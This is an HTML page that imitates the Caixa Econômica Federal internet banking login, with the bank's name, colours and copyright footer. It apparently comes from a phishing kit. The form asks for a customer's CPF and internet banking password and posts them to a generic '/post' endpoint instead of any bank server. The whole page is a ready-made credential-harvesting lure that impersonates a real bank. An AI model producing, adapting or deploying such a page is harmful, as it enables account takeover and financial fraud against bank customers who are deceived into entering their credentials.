<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caixa - Internet Banking</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #005CA9 0%, #003D71 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: #fff;
            border-radius: 12px;
            padding: 40px 32px;
            width: 90%;
            max-width: 380px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        }

        .logo {
            text-align: center;
            margin-bottom: 24px;
            padding: 16px;
            background: #F26522;
            border-radius: 8px;
        }

        .logo-text {
            font-size: 24px;
            font-weight: bold;
            color: #fff;
            letter-spacing: 2px;
        }

        h1 {
            color: #005CA9;
            font-size: 20px;
            text-align: center;
            margin-bottom: 8px;
        }

        p {
            color: #666;
            text-align: center;
            margin-bottom: 24px;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            color: #005CA9;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #E0E0E0;
            border-radius: 8px;
            font-size: 16px;
        }

        input:focus {
            outline: none;
            border-color: #F26522;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #F26522;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        button:hover {
            background: #D45515;
        }

        .tabs {
            display: flex;
            margin-bottom: 24px;
        }

        .tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            border: 2px solid #E0E0E0;
            cursor: pointer;
            font-size: 14px;
            color: #666;
        }

        .tab:first-child {
            border-radius: 8px 0 0 8px;
        }

        .tab:last-child {
            border-radius: 0 8px 8px 0;
        }

        .tab.active {
            background: #005CA9;
            color: #fff;
            border-color: #005CA9;
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 11px;
            color: #999;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">
            <div class="logo-text">CAIXA</div>
        </div>
        <h1>Acesse sua conta</h1>
        <div class="tabs">
            <div class="tab active">CPF</div>
            <div class="tab">NIS</div>
        </div>
        <form action="/post" method="post">
            <div class="form-group">
                <label>CPF</label>
                <input type="text" name="user" placeholder="000.000.000-00" required>
            </div>
            <div class="form-group">
                <label>Senha Internet</label>
                <input type="password" name="pass" placeholder="Sua senha" required>
            </div>
            <button type="submit">Entrar</button>
        </form>
        <div class="footer">Caixa Econômica Federal © 2024</div>
    </div>
</body>

</html>
